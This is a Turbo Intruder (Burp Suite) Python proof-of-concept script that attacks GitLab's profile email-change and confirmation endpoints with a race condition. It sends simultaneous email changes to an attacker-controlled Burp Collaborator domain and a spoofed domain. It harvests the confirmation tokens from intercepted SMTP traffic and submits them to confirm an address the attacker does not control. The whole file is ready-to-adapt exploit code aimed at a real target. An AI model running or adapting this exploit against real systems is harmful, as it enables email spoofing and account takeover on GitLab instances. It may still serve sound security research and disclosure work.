# This will require extensive tailoring to your target - consider it as a proof of concept
import base64
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://gitlab.example.com:443',
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.SPIKE,
                           maxRetriesPerRequest=3
                           )


    confirm = r'''GET /users/confirmation?confirmation_token=%s HTTP/2
Host: gitlab.example.com

'''

    change = r'''POST /-/profile HTTP/1.1
Host: gitlab.example.com

email=%s
'''

    token = 'just-starting'

    for i in range(50000):
        gate = 'race'+str(i)
        collab = callbacks.createBurpCollaboratorClientContext()

        domain1 = collab.generatePayload(True)

        engine.queue(change, 'onexyzz'+str(i)+'x@'+domain1)
        time.sleep(1)

        engine.queue(change, 'twoxyzz'+str(i)+'x@domain-to-spoof', gate=gate)
        engine.queue(change, 'onexyzz'+str(i)+'x@'+domain1, gate=gate)

        engine.openGate(gate)
        x = 0
        seen = 0
        tokens = {}
        while x < 10 and seen < 2:
            time.sleep(1)
            x += 1
            interactions = collab.fetchAllCollaboratorInteractions()
            for interaction in interactions:
                smtp = interaction.getProperty('conversation')
                if smtp == None:
                    continue

                decoded = base64.b64decode(smtp)

                token = decoded.partition('confirmation_token=')[2].partition('\r\n')[0]
                if token == '':
                    # print 'no token'
                    continue

                email = decoded.partition('RCPT TO:<')[2].partition('@')[0]
                seen += 1
                if token in tokens.keys():
                    if smtp == tokens[token]:
                        continue
                    print 'duplicate token: '+token
                    print smtp
                    print tokens[token]
                    print '---------------'
                    engine.cancel()

                tokens[token] = smtp

                print 'Got token: '+token+' for email '+email
                dupe = ('onexyzz' in decoded and 'twoxyzz' in decoded) or ('onexyzz' in decoded and 'threexyzz' in decoded) or ('twoxyzz' in decoded and 'threexyzz' in decoded)
                engine.queue(confirm, token+'&dupe='+str(dupe)+'&smtp='+smtp, label=email)
                time.sleep(1)


def handleResponse(req, interesting):
    if req.label == 'ignore':
        return

    if req.label and 'xyzz' in req.label and '302 OK' in req.response:
        if req.label not in req.response:
            print 'success, aborting attack'
            table.add(req)
            req.engine.cancel()

    if 'dupe=True' in req.request:
        req.label = req.label + ' dupe'

    table.add(req)